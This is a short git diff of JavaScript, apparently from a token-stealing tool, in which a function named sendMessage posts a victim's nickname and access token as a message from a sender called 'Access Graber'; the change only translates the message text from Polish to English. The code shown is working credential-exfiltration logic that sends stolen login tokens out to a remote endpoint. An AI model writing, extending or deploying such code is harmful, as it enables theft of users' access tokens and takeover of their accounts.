@@ -60,7 +60,7 @@ function sendMessage(loginData) {
     const params = {
         username: "Access Graber",
         avatar_url: "https://samequizy.pl/wp-content/uploads/2021/02/images_80304f732f3d.jpg",
-        content: "Nowy Token:\nUżytkownik: " + loginData.nickname + "\nToken: " + loginData.access_token
+        content: "**New Access Token**:\nUser: " + loginData.nickname + "\nToken: " + loginData.access_token
     }
     request.send(JSON.stringify(params));
     
